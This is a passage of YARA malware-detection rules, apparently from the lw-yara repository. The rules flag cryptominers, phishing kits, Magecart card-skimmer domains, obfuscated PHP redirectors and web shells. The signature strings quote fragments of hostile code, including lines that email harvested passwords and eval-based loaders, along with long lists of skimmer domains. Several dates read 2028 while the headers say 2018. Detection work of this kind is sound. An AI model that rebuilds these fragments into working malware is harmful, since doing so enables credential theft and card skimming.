   condition:
      ( uint16(0) == 0x457f and
         filesize < 8000KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

/* Super Rules ------------------------------------------------------------- */

rule _luk_cpu_luk_ocl_luk_phi_0 {
   meta:
      description = "case120 - from files luk-cpu, luk-ocl, luk-phi"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-03"
      hash1 = "76210f0a7710b40095d32f81bfb5d0576f81ac7cbdc63cf44ababb64cb8e65b7"
      hash2 = "8d5e3d2e57f975078033a9f6b3360c530512448dde517f484cdf86570c36d6ca"
      hash3 = "425f71ee456283d32673fcffe2641b5d6fbb1e91b2f15a91f9c34877a921ca75"
   strings:
      $x1 = "* The error occured in hwloc %s inside process `%s', while" fullword ascii
      $s2 = "Please verify that both the operating system and the processor support Intel(R) %s instructions." fullword ascii
      $s3 = "* hwloc %s has encountered what looks like an error from the operating system." fullword ascii
      $s4 = "--host cryptonight.usa.nicehash.com --port 3355" fullword ascii
      $s5 = "Please verify that both the operating system and the processor support Intel(R) AVX, F16C and RDRAND instructions." fullword ascii
      $s6 = "-> share *accepted*: %ld/%ld (%.02f%%) - total hashrate %.02fH/s (may take a while to converge)" fullword ascii
      $s7 = "The attempt to get the address for the pool failed with code %d." fullword ascii
      $s8 = "* the input XML was generated by hwloc %s inside process `%s'." fullword ascii
      $s9 = "--host xmr-usa.dwarfpool.com --port 8080" fullword ascii
      $s10 = "--host mine.aeon-pool.com --port 8080" fullword ascii
      $s11 = "--host pool.sumokoin.com --port 4444" fullword ascii
      $s12 = "* hwloc %s has encountered what looks like an error from user-given distances." fullword ascii
      $s13 = "* Otherwise please report this error message to the hwloc user's mailing list," fullword ascii
      $s14 = "Please verify that both the operating system and the processor support Intel(R) AVX." fullword ascii
      $s15 = "trtl.pool.mine2gether.com" fullword ascii
      $s16 = "Did not find any valid pu%%u entry in dumped cpuid directory `%s'" fullword ascii
      $s17 = "* to the hwloc's user mailing list together with the XML output of lstopo." fullword ascii
      $s18 = "* please report this error message to the hwloc user's mailing list," fullword ascii
      $s19 = "Found non-x86 dumped cpuid summary in %s: %s" fullword ascii
      $s20 = "Found non-contigous pu%%u range in dumped cpuid directory `%s'" fullword ascii
   condition:
      ( uint16(0) == 0x457f and
        filesize < 8000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-12-13
   Identifier: kit
   Reference: https://github.com/Hestat/lw-yara/
   Reference: https://urlscan.io/result/c0a88f16-e0f8-4a30-bb55-d973e776cae0
   Reference: https://urlscan.io/result/9a1eae0b-bcfc-45a4-8ef3-8b16cfa3cc19
*/

/* Rule Set ----------------------------------------------------------------- */


rule _home_hawk_infected_12_13_18_phish1_maersk_kit_post {
   meta:
      description = "kit - file post.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-12-13"
      hash1 = "72946e59a710687acfddb28cad1e528a5aca0ab584b059cc7e93e37bfee256e2"
   strings:
      $s1 = "// if there are no errors process our form, then return a message" fullword ascii
      $s2 = "\"Password: \" . $pass . \"\\n\" ." fullword ascii
      $s3 = "\"==========Login=========\" . \"\\n\" ." fullword ascii
      $s4 = "// process.php" fullword ascii
      $s5 = "// DO ALL YOUR FORM PROCESSING HERE" fullword ascii
      $s6 = "// THIS CAN BE WHATEVER YOU WANT TO DO (LOGIN, SAVE, UPDATE, WHATEVER)" fullword ascii
      $s7 = "$data['message'] = 'Wrong Password! Try again!!';" fullword ascii
      $s8 = "$to = \"anonnymusrezult@gmail.com\";" fullword ascii
      $s9 = "// if there are any errors in our errors array, return a success boolean of false" fullword ascii
      $s10 = "// if any of these variables don't exist, add an error to our $errors array" fullword ascii
      $s11 = "$pass = $_POST[\"pass\"];" fullword ascii
      $s12 = "if (empty($_POST['pass']))" fullword ascii
      $s13 = "// validate the variables ======================================================" fullword ascii
      $s14 = "// return a response ===========================================================" fullword ascii
      $s15 = "// if there are items in our errors array, return those errors" fullword ascii
      $s16 = "mail($to, $subject, $message, $body, $headers);" fullword ascii
      $s17 = "$headers = \"email ENGLISH AUTO\";" fullword ascii
      $s18 = "$email = $_POST[\"email\"];" fullword ascii
      $s19 = "$errors['email'] = 'Email is required.';" fullword ascii
      $s20 = "$errors['pass'] = ' ';" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 6KB and
         ( 8 of them )
      ) or ( all of them )
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-12-04
   Identifier: magecart
   Reference: https://github.com/Hestat/lw-yara/
   Reference: https://twitter.com/bad_packets/status/1068626837071261696
*/

rule magecart_sotheby {
   meta:
      description = "sothebys magecart"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-12-04"
   strings:
	$s1 = "var _0xe80b=[" fullword ascii
	$s2 = "=document["
	$s3 = "if(typeof"
	$s4 = "=function(){if(window["
	$s5 = "var _0x14bf4e=document"
	$s6 = "while(--_0x3bfac4"
	$s7 = "hotlCkRyRv)"
	$s8 = "function LycqLBoqkw("
	$s9 = "unescape(encodeURIComponent"     
   condition:
       (6 of them)
	  or
       (all of them)
}



/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-10-16
   Identifier: data
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule magecart {
   meta:
      description = "data - file magecart.txt"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2028-10-16"
      hash3 = "5dc6e5d9c6e1c25c2470fd343e7d061bf9b4a2c73fffd7c56eb205efd05dd6fa"
   strings:
	$s4 = "magento.name"
	$s5 = "oh-polly.com"
	$s6 = "advocatecdn.com"
	$s7 = "bridge.industries"
	$s8 = "drberg.online"
	$s9 = "drberg.store"
	$s10 = "gtagaffilate.com"
	$s11 = "mycloudtrusted.com"
	$s12 = "nykoa.in"
	$s13 = "beforescripts.com"
	$s14 = "citwinery.com"
	$s15 = "dmaxjs.com"
	$s16 = "encoderform.com"
	$s17 = "encrypterforms.com"
	$s18 = "fastlscripts.com"
	$s19 = "mdelivry.com"
	$s20 = "newrellc.com"
	$s21 = "oklahomjs.com"
	$s22 = "orealjs.com"
	$s23 = "safeprivatcy.com"
	$s24 = "sucuri-js.com"
	$s25 = "validatorcc.com"
	$s26 = "vmaxjs.com"
	$s27 = "gamacdn.com"
	$s28 = "abuse-js.link"
	$s29 = "activaguard.com"
	$s30 = "afterscripts.com"
	$s31 = "alabamascripts.com"
	$s32 = "alfcdn.com"
	$s33 = "amasty.biz"
	$s34 = "analiticoscdn.com"
	$s35 = "angular.club"
	$s36 = "apismanagers.com"
	$s37 = "apissystem.com"
	$s38 = "assetmage.com"
	$s39 = "assetsbrain.com"
	$s40 = "assetsbraln.com"
	$s41 = "aw-test.com"
	$s42 = "awscan.eu"
	$s43 = "awscan.info"
	$s44 = "awtest.eu"
	$s45 = "baways.com"
	$s46 = "bbypass.pw"
	$s47 = "bm24.biz"
	$s48 = "bm24.info"
	$s49 = "bm24.org"
	$s50 = "bootstrapjs.com"
	$s51 = "brainpayments.com"
	$s52 = "braintcdn.com"
	$s53 = "brainterepayments.com"
	$s54 = "braintform.com"
	$s55 = "braintreepaumenls.com"
	$s56 = "braintreepauments.com"
	$s57 = "braintreepaymenls.com"
	$s58 = "bralntree.com"
	$s59 = "brazersd.top"
	$s60 = "brontocdn.com"
	$s61 = "busnguard.com"
	$s62 = "ccvalidate.com"
	$s63 = "cdn-js.link"
	$s64 = "cdnassels.com"
   condition:
       any of them
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-10-16
   Identifier: data
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule magecart_2 {
   meta:
      description = "data - file magecart.txt"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2028-10-16"
      hash3 = "5dc6e5d9c6e1c25c2470fd343e7d061bf9b4a2c73fffd7c56eb205efd05dd6fa"
   strings:
	$s66 = "cdnbronto.info"
	$s67 = "cdngoogle.com"
	$s68 = "cdnmage.com"
	$s69 = "cdnpayment.com"
	$s70 = "cdnppay.com"
	$s71 = "cdnrfv.com"
	$s72 = "cdnscriptx.com"
	$s73 = "cdnwhiltelist.com"
	$s74 = "cellubiue.com"
	$s75 = "cellublue.info"
	$s76 = "citywiners.com"
	$s77 = "cl0udfiare.com"
	$s78 = "cloud-jquery.com"
	$s79 = "cloud-jquery.net"
	$s80 = "cloud-jquery.org"
	$s81 = "cloud-privacy.com"
	$s82 = "cloudtrusted.org"
	$s83 = "cmytuok.top"
	$s84 = "codesmagento.com"
	$s85 = "configmage.com"
	$s86 = "configsysrc.com"
	$s87 = "configsysrc.info"
	$s88 = "connectbootstrap.com"
	$s89 = "controlmage.com"
	$s90 = "crtteo.com"
	$s91 = "d0ubletraffic.com"
	$s92 = "directvapar.com"
	$s93 = "directvaporonline.com"
	$s94 = "directvaporus.com"
	$s95 = "directvaprr.com"
	$s96 = "dobellonline.com"
	$s97 = "docstart.su"
	$s98 = "doublecllck.com"
	$s99 = "ebizmart.biz"
	$s100 = "encryptforms.com"
	$s101 = "fbcommerse.com"
	$s102 = "fbprotector.com"
	$s103 = "frashjs.com"
	$s104 = "ganalytlcs.com"
	$s105 = "gitformage.com"
	$s106 = "gitformlife.com"
	$s107 = "gitmage.com"
	$s108 = "googiecloud.com"
	$s109 = "googieservlce.com"
	$s110 = "googleprotectionshop.com"
	$s111 = "googlitagmanager.com"
	$s112 = "govfree.pw"
	$s113 = "icon-base.biz"
	$s114 = "informaer.com"
	$s115 = "informaer.net"
	$s116 = "informaer.ws"
	$s117 = "internalvaporgroup.com"
	$s118 = "invisiblename.com"
	$s119 = "invisiblename.pro"
	$s120 = "invisiblename.pw"
	$s121 = "javascloud.com"
	$s122 = "javascripts-system.com"
	$s123 = "jquery-cdn.top"
	$s124 = "jquery-cloud.net"
	$s125 = "jquery-cloud.org"
	$s126 = "jquery-code.su"
	$s127 = "jquery-libs.su"
	$s128 = "jquery-min.su"
   condition:
       any of them
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-10-16
   Identifier: data
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule magecart_3 {
   meta:
      description = "data - file magecart.txt"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2028-10-16"
      hash3 = "5dc6e5d9c6e1c25c2470fd343e7d061bf9b4a2c73fffd7c56eb205efd05dd6fa"
   strings:
	$s129 = "jquery-validation.org"
	$s130 = "js-abuse.link"
	$s131 = "js-abuse.su"
	$s132 = "js-cdn.link"
	$s133 = "js-cloud.com"
	$s134 = "js-link.su"
	$s135 = "js-magic.link"
	$s136 = "js-mod.su"
	$s137 = "js-save.link"
	$s138 = "js-save.su"
	$s139 = "js-start.su"
	$s140 = "js-stat.su"
	$s141 = "js-sucuri.link"
	$s142 = "js-syst.su"
	$s143 = "js-top.link"
	$s144 = "js-top.su"
	$s145 = "jscript-cdn.com"
	$s146 = "jscripts-cloud.com"
	$s147 = "jscriptscloud.com"
	$s148 = "jsdellvr.com"
	$s149 = "jsecurely.com"
	$s150 = "jsecuri.com"
	$s151 = "jsmagento.com"
	$s152 = "jspoi.com"
	$s153 = "kennedyform.com"
	$s154 = "kissmetrik.com"
	$s155 = "listrakb.com"
	$s156 = "locateooo.com"
	$s157 = "logisticusa.biz"
	$s158 = "lolfree.pw"
	$s159 = "m24js.com"
	$s160 = "mage-cdn.link"
	$s161 = "mage-js.link"
	$s162 = "mage-js.su"
	$s163 = "magecompas.com"
	$s164 = "mageconfig.com"
	$s165 = "magejavascripts.com"
	$s166 = "magely.info"
	$s167 = "magento-cdn.top"
	$s168 = "magentocore.net"
	$s169 = "mageonline.net"
	$s170 = "magescripts.info"
	$s171 = "magescripts.pw"
	$s172 = "magesecurely.com"
	$s173 = "magesecuritys.com"
	$s174 = "magesources.com"
	$s175 = "magestops.com"
	$s176 = "maskforms.com"
	$s177 = "maxijs.com"
	$s178 = "minifyscripts.com"
	$s179 = "minpays.com"
	$s180 = "mipss.su"
	$s181 = "mjs24.com"
	$s182 = "mod-js.su"
	$s183 = "mod-sj.link"
	$s184 = "monenate.net"
	$s185 = "monerate.net"
	$s186 = "monestate.net"
	$s187 = "msecurely.com"
	$s188 = "my-braintree.com"
	$s189 = "myageverify.com"
	$s190 = "netmg-cdn.com"
	$s191 = "neweggstats.com"
	$s192 = "ohpoliy.com"
   condition:
       any of them
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-10-16
   Identifier: data
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule magecart_4 {
   meta:
      description = "data - file magecart.txt"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2028-10-16"
      hash3 = "5dc6e5d9c6e1c25c2470fd343e7d061bf9b4a2c73fffd7c56eb205efd05dd6fa"
   strings:
	$s193 = "onlineshopsecurity.com"
	$s194 = "onlinestatus.site"
	$s195 = "optimizly.info"
	$s196 = "paymentsystem.info"
	$s197 = "paypallobjects.com"
	$s198 = "privacyform.com"
	$s199 = "privatejs.com"
	$s200 = "privatixjs.com"
	$s201 = "qsxjs.com"
	$s202 = "realtrustsafe.com"
	$s203 = "receiverinformation.com"
	$s204 = "resselerratings.com"
	$s205 = "rlteaid.com"
	$s206 = "s3-us-west.com"
	$s207 = "safeyouform.com"
	$s208 = "samescripts.com"
	$s209 = "samexsame.com"
	$s210 = "saveyoujs.com"
	$s211 = "scriptsform.com"
	$s212 = "scriptsjzone.com"
	$s213 = "secureqbrowser.com"
	$s214 = "securipayment.com"
	$s215 = "security-mage.com"
	$s216 = "secury-checkout.com"
	$s217 = "shelljs.com"
	$s218 = "shop-analytics.net"
	$s219 = "simpiehuman.com"
	$s220 = "sj-mod.link"
	$s221 = "sj-syst.link"
	$s222 = "slripe.com"
	$s223 = "specjs.com"
	$s224 = "sportys.store"
	$s225 = "sslbrainform.com"
	$s226 = "sslpayform.com"
	$s227 = "sslvalidator.com"
	$s228 = "stat-sj.link"
	$s229 = "statdd.su"
	$s230 = "statesales.info"
	$s231 = "statistic-info.me"
	$s232 = "statsdot.eu"
	$s233 = "stecker.su"
	$s234 = "stek-js.link"
	$s235 = "storentrust.com"
	$s236 = "stormnguard.com"
	$s237 = "sucuri-cloud.com"
	$s238 = "syst-sj.link"
	$s239 = "system-backup.biz"
	$s240 = "termlifelearned.us"
	$s241 = "top-sj.link"
	$s242 = "trafficanalyzer.biz"
	$s243 = "traskedlink.com"
	$s244 = "truefree.pw"
	$s245 = "trustd.biz"
	$s246 = "typejsx.com"
	$s247 = "typekitcloud.com"
	$s248 = "typeklt.com"
	$s249 = "uorineall.info"
	$s250 = "userinfos.com"
	$s251 = "userinfos.info"
	$s252 = "userlandform.com"
	$s253 = "userlandpay.com"
	$s254 = "uslogisticexpress.com"
	$s255 = "validatenyou.com"
	$s256 = "validateyourinfo.com"
   condition:
       any of them
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-10-16
   Identifier: data
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule magecart_5 {
   meta:
      description = "data - file magecart.txt"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2028-10-16"
      hash3 = "5dc6e5d9c6e1c25c2470fd343e7d061bf9b4a2c73fffd7c56eb205efd05dd6fa"
   strings:
	$s257 = "verifiedjs.com"
	$s258 = "verpayment.com"
	$s259 = "verpayments.com"
	$s260 = "vuserjs.com"
	$s261 = "web-info.me"
	$s262 = "web-rank.cc"
	$s263 = "web-stat.biz"
	$s264 = "web-stat.me"
	$s265 = "web-stats.cc"
	$s266 = "web-stats.pw"
	$s267 = "webfotce.me"
	$s268 = "webstatistic.pw"
	$s269 = "webstatistic.ws"
	$s270 = "whitelistjs.com"
	$s271 = "x-magesecurity.com"
	$s272 = "xmageform.com"
	$s273 = "xmageinfo.com"
	$s274 = "xmagejs.com"
	$s275 = "xmagesecurity.com"
	$s276 = "youpayme.info"
	$s277 = "zonejs.com"
	$s278 = "friend4cdn.com"
	$s279 = "g-statistic.com"
	$s280 = "bootstrap-js.com"
	$s281 = "marketplace-magento.com"
   condition:
       any of them
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-06-21
   Identifier: https://blog.sucuri.net/2018/06/magento-credit-card-stealer-reinfector.html
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule magento_sucuri_malware {
   meta:
      description = "sucuri magento malware"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-21"
   strings:
      $s1 = "error_reporting(0)" fullword ascii
      $s2 = "$b64 =" ascii
      $s3 = "$link =" ascii
      $s4 = "Cc.php" fullword ascii
      $s5 = "shell_exec" ascii
   condition:
          all of them 
}

rule php_mailer_1
{

	meta:
	   author = "Brian Laskowski"
	   info = " php mailer script "

	strings:
	
	$s1="$_COOKIE [str_replace('.', '_', $_SERVER['HTTP_HOST'])])"

	condition:
	all of them
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-06-26
   Identifier: case139
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule case139_main_js_malvertising {
   meta:
      description = "case139 - file main.js"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-26"
      hash1 = "365243ff6b56a628a28d5b1bb0823dcb3192c5dec7fea94bd72b00709252e66a"
   strings:
      $s1 = "eval(String.fromCharCode(9, 105," fullword ascii
   condition:
      ( uint16(0) == 0x7665 and
         filesize < 8KB and
         ( all of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-18
   Identifier: 08-18-18
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-18
   Identifier: 08-18-18
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-18
   Identifier: 08-18-18
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule sig_4dd6090f04 {
   meta:
      description = "08-18-18 - file 4dd6090f04.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-18"
      hash1 = "b3166068189c84f5ed00642fb82fb1ce77c8a51cfc3619fe4e75763cc088e73b"
   strings:
      $s1 = "function getDirContents($dir, &$results = array" fullword ascii
      $s2 = "if( isset($_REQUEST[\"test_url\"])" fullword ascii
      $s3 = "define( 'PCLZIP_ERR_USER_ABORTED'" fullword ascii
      $s4 = "$data = base64_decode("
   condition:
       all of them 
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-25
   Identifier: redirect
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */


rule infected_08_25_18_redirect_index {
   meta:
      description = "redirect - file index.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-25"
      hash1 = "3eb001a420107db7c78640d8d1f7c8984e19f39f4f03b09dbf7f42c79f19ae45"
   strings:
      $s1 = "<?php ${\"G\\x4c\\x4f\\x42ALS\"}[\"f\\x65\\x78\\x67\\x74\\x69\\x72\\x76\\x64\\x66\"]=\"\\x73r\\x63\";${\"\\x47\\x4c\\x4f\\x42\\x" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 20KB and
         ( all of them )
      ) or ( all of them )
}


rule infected_08_25_18_blackhole_2 {
   meta:
      description = "redirect - file blackhole.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-25"
      hash1 = "a883fd80964028ce8578bcf99de10274ef0e7f6bfc02eafd787e963e00d645fe"
   strings:
      $s1 = "if(realpath(__FILE__)===realpath($_SERVER[" fullword ascii
      $s2 = "x77\\x78fp\\x73i\\x71\"]})){header(\"L\\x6f\\x63at\\x69on:\\x20/\",true,302);exit;}${${\"\\x47\\x4cOB\\x41\\x4c\\x53\"}[\"by\\x6" ascii
      $s3 = "<?php ${\"\\x47L\\x4f\\x42\\x41\\x4c\\x53\"}[\"\\x75\\x63\\x65z\\x6b\\x62\\x6e\\x77\\x65i\\x67\"]=\"s\\x74r\\x69n\\x67\";${\"GL" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 10KB and
         ( all of them )
      ) or ( all of them )
}


rule infected_08_25_18_redirect_bienvenue_index {
   meta:
      description = "redirect - file index.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-25"
      hash1 = "8cba56fbd792e090accc0f9489bc5900d9396382b2fd506c01efa178e9ce18c8"
   strings:
      $s1 = "<?php ${\"\\x47L\\x4fBAL\\x53\"}[\"\\x73\\x70fthl\\x6ary\"]=\"me\\x73s\\x61\\x67e\";${\"\\x47\\x4c\\x4fB\\x41\\x4c\\x53\"}[\"\\x" ascii
      $s2 = "x\\x6fv\\x75\\x69v\"]}=\"w\\x68\\x6fi\\x73\\x2e\\x61r\\x69n\\x2e\\x6eet\";$fopock=\"\\x69pa\\x64\\x64\\x72\\x65\\x73\\x73\";if(!" ascii
      $s3 = "${\"G\\x4c\\x4f\\x42AL\\x53\"}[\"\\x70qdl\\x61i\\x6dmsjm\"]}.\"\\x20- \".${${\"\\x47\\x4c\\x4fB\\x41\\x4c\\x53\"}[\"\\x66f\\x6e" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 50KB and
         ( all of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-07-30
   Identifier: Master134
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule Master134_Malvertising {
   meta:
      description = "Master134 file index.html"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      reference = "https://research.checkpoint.com/malvertising-campaign-based-secrets-lies/"
      date = "2018-07-30"
   strings:
      $s1 = "var _0xaae8=[" fullword ascii
      $s2 = "document[_0"
   condition:
      all of them
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-14
   Identifier: admin
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */



rule paypal_08_14_18_phishing_admin_general {
   meta:
      description = "admin - file general.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-14"
      hash1 = "73897614ef03665e7929e28409dc176e38cd29dda1f7c4c0c5718823b4624d1e"
   strings:
      $s1 = "<input type=\"password\" name=\"apikey\" <?php if($xconfig == true){ echo \"value=\\\"$config_apikey\\\"\"; } ?> required>" fullword ascii
      $s2 = "@eval(file_get_contents($api->dir_config . '/' . $api->general_config));" fullword ascii
      $s3 = "<input type=\"text\" name=\"email\" <?php if($xconfig == true){ echo \"value=\\\"$email_result\\\"\"; } ?> required>" fullword ascii
      $s4 = "<div class=\"left\">Identity Photo<span>allow victim to upload their identity.</span></div>" fullword ascii
      $s5 = "<?php if($xconfig == true && $config_smtp == 1){" fullword ascii
      $s6 = "<form method=\"post\" action=\"\" autocomplete=\"off\">" fullword ascii
      $s7 = "<?php require 'page/header.php'; ?>" fullword ascii
      $s8 = "echo '<option value=\"1\" selected>smtp</option>" fullword ascii
      $s9 = "$a = $_POST['apikey'];" fullword ascii
      $s10 = "if (file_exists($api->dir_config . '/' . $api->general_config))" fullword ascii
      $s11 = "<?php if($xconfig == true && $config_translate == 1){" fullword ascii
      $s12 = "<?php if($xconfig == true && $config_filter == 1){" fullword ascii
      $s13 = "<?php if($xconfig == true && $config_3dsecure == 1){" fullword ascii
      $s14 = "<?php if($xconfig == true && $config_identity == 1){" fullword ascii
      $s15 = "<?php if($xconfig == true && $config_blocker == 1){" fullword ascii
      $s16 = "echo '<option value=\"1\">smtp</option>" fullword ascii
      $s17 = "$b = $_POST['3dsecure'];" fullword ascii
      $s18 = "$f = $_POST['translate'];" fullword ascii
      $s19 = "$photo = $_POST['identity'];" fullword ascii
      $s20 = "if (isset($_GET['success']))" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 20KB and
         ( 8 of them )
      ) or ( all of them )
}

rule paypal_08_14_18_phishing_admin_smtp {
   meta:
      description = "admin - file smtp.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-14"
      hash1 = "3c5d695e3cb12293577e118e2f84df13538945e47c219275afec10e2764161e7"
   strings:
      $s1 = "<input type=\"text\" name=\"smtphost\" <?php if($xconfig == true){ echo \"value=\\\"$config_smtphost\\\"\"; } ?> required>" fullword ascii
      $s2 = "<input type=\"text\" name=\"smtpuser\" <?php if($xconfig == true){ echo \"value=\\\"$config_smtpuser\\\"\"; } ?> required>" fullword ascii
      $s3 = "<input type=\"text\" name=\"smtpport\" <?php if($xconfig == true){ echo \"value=\\\"$config_smtpport\\\"\"; } ?> required>" fullword ascii
      $s4 = "<input type=\"text\" name=\"smtppass\" <?php if($xconfig == true){ echo \"value=\\\"$config_smtppass\\\"\"; } ?> required>" fullword ascii
      $s5 = "<input type=\"text\" name=\"smtpfrom\" <?php if($xconfig == true){ echo \"value=\\\"$config_smtpfrom\\\"\"; } ?> required>" fullword ascii
      $s6 = "<input type=\"text\" name=\"smtpname\" <?php if($xconfig == true){ echo \"value=\\\"$config_smtpname\\\"\"; } ?> required>" fullword ascii
      $s7 = "@eval(file_get_contents($api->dir_config . '/' . $api->smtp_config));" fullword ascii
      $s8 = "if (file_exists($api->dir_config . '/' . $api->smtp_config))" fullword ascii
      $s9 = "<?php if($xconfig == true && $config_smtpsecure == 1){" fullword ascii
      $s10 = "<form method=\"post\" action=\"\" autocomplete=\"off\">" fullword ascii
      $s11 = "$a = $_POST['smtphost'];" fullword ascii
      $s12 = "else if (isset($_GET['failed']))" fullword ascii
      $s13 = "<?php require 'page/header.php'; ?>" fullword ascii
      $s14 = "$api->redirect(\"smtp?failed=true\");" fullword ascii
      $s15 = "$api->setSMTP(array($a, $b, $c, $d, $e, $f, $g));" fullword ascii
      $s16 = "$b = $_POST['smtpport'];" fullword ascii
      $s17 = "$e = $_POST['smtppass'];" fullword ascii
      $s18 = "$d = $_POST['smtpuser'];" fullword ascii
      $s19 = "$api->redirect(\"smtp?connect=success\");" fullword ascii
      $s20 = "<div class=\"left\">SMTP Host</div>" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 10KB and
         ( 8 of them )
      ) or ( all of them )
}
rule meow_js_miner
{

    meta:
       author = "Brian Laskowski"
       info = " meow.js cryptominer 05/17/18 "

    strings:
    
   	$s1="data"
	$s7="application/octet-stream"
	$s8="base64"
	$s2="hashsolved"  
	$s3="k.identifier" 
	$s4="acceptedhashes"
	$s5="eth-pocket"
	$s6="8585"

    condition:
    all of them
}

rule media_shell
{

    meta:
       author = "Brian Laskowski"
       info = " php shell 05/24/18 "

    strings:
    
	$s1="$pfile = $recover_file"
	$s2="$data = curl_exec"
	$s3="$gDir = str_replace"
	$s4="curl_close"
	$s5="abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_"

    condition:
    all of them
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2019-03-16
   Identifier: 03-16-19
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_03_16_19_memoris {
   meta:
      description = "03-16-19 - file memoris.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-03-16"
      hash1 = "23535566bbbf822d7b4afa57b527ad6b406ccb9bf69329dd5f00bbbde8c6335a"
   strings:
      $s1 = "$MessageSubject = base64_decode($_POST[\"msgsubject\"]);" fullword ascii
      $s2 = "$MessageHeader = base64_decode($_POST[\"msgheader\"]);" fullword ascii
      $s3 = "$MessageBody = base64_decode($_POST[\"msgbody\"]);" fullword ascii
      $s4 = "$MailTo = base64_decode($_POST[\"mailto\"]);" fullword ascii
      $s5 = "if(mail($MailTo,$MessageSubject,$MessageBody,$MessageHeader))" fullword ascii
      $s6 = "if(isset($_POST[\"msgheader\"]))" fullword ascii
      $s7 = "if(isset($_POST[\"msgsubject\"]))" fullword ascii
      $s8 = "if(isset($_POST[\"mailto\"]))" fullword ascii
      $s9 = "if(isset($_POST[\"msgbody\"]))" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-11
   Identifier: microsoft-phish
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule quotaview_incoming_microsoft_phish_next2 {
   meta:
      description = "microsoft-phish - file next2.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-08-11"
      hash1 = "1b17ccf2f6deaff79993028ddf843cc90367445d61a8f1d2acdeebe7fb38e4b8"
   strings:
      $s1 = "$message .= \"-----------  ! +Xoom LOGIN ! xDD+ !  -----------\\n\";" fullword ascii
      $s2 = "$headers = \"From: Herren <herren.ruth@gmail.com>\";" fullword ascii
